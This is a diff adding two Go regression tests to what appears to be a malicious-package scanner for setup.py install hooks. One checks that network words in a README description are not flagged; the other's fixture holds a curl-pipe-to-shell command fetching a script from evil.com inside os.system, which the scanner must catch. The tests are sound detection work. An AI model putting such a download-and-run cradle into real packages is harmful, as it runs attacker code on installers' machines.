@@ -316,6 +316,62 @@ setup(**setup_kwargs)
 	}
 }
 
+// Regression for the beats live-fire: network client-name markers embedded in a
+// setup.py long_description README (example code, tool names) or the description
+// are package METADATA, not install-time egress — a string literal passed to
+// setup() never executes. They must not raise CapNetwork (VC-002b). This was the
+// FP on backoff / deprecated / pyasn1.
+func TestSetupPyReadmeNetworkWordsNotNetwork(t *testing.T) {
+	setupPy := `
+from setuptools import setup
+setup(
+    name="backoff",
+    description="Function decoration for backoff and retry; wraps requests.get and aiohttp calls",
+    long_description="""
+Backoff
+=======
+Example::
+
+    import requests
+    @backoff.on_exception(backoff.expo, requests.exceptions.RequestException)
+    def get_url(url):
+        return requests.get(url)
+
+You can also curl the endpoint or use httpx.get() / urllib.request.urlopen().
+""",
+    url="https://github.com/litl/backoff",
+)
+`
+	hooks := analyzeSetupPy(setupPy)
+	for _, h := range hooks {
+		if h.HasCap(CapNetwork) {
+			t.Errorf("network words in long_description/description are metadata, not egress; evidence: %v", h.Evidence)
+		}
+	}
+}
+
+// Guard against over-stripping: a shell cradle passed to os.system is a COMMAND
+// string, not a doc field, and must still raise CapNetwork even though a benign
+// network word sits in long_description.
+func TestSetupPyCradleInCommandStringStillDetected(t *testing.T) {
+	setupPy := `
+from setuptools import setup
+import os
+os.system("curl https://evil.com/p.sh | sh")
+setup(name="evil", long_description="benign readme mentioning requests.get for docs")
+`
+	hooks := analyzeSetupPy(setupPy)
+	var net bool
+	for _, h := range hooks {
+		if h.HasCap(CapNetwork) {
+			net = true
+		}
+	}
+	if !net {
+		t.Error("a real curl cradle in os.system(...) must still raise CapNetwork when long_description is stripped")
+	}
+}
+
 func TestExtractBuildRequiresSingleLine(t *testing.T) {
 	toml := `[build-system]
 requires = ["setuptools>=64", "wheel"]
